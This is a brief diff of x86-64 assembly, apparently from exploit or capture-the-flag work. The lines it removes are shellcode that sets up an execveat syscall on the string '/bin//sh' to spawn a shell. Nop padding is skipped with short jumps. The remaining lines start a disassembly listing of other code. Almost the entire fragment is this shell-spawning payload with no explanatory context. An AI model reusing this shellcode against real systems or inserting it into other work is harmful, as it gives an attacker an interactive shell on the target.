@@ -1,32 +1,3 @@
-push   0x42
-pop    rax
-inc    ah
-cqo
-push   rdx
-jmp    $+8
-nop
-nop
-nop
-nop
-nop
-nop
-movabs rdi, 0x68732f2f6e69622f
-jmp    $+8
-nop
-nop
-nop
-nop
-nop
-nop
-push   rdi
-push   rsp
-pop    rsi
-mov    r8, rdx
-
-mov    r10, rdx
-syscall
-
-
 0:  48 83 c4 50             add    rsp,0x50
 4:  eb 0a                   jmp    10 <_main+0x10>
 6:  90                      nop
